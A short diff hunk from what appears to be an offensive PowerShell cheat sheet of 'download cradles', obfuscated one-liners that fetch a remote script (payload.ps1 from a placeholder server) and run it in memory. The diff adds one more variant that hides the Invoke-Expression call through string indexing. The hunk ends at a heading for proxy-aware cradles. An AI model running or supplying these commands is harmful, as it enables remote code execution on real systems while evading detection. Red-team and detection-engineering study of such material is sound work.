@@ -10,6 +10,7 @@ ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.Inv
 ps> &( ([String]''.Normalize)[3,45,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
 ps> $url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression
 ps> $url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';IEX($wc.$ds.Invoke($url))
+ps> &( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
 
 
 # Proxy aware download cradles
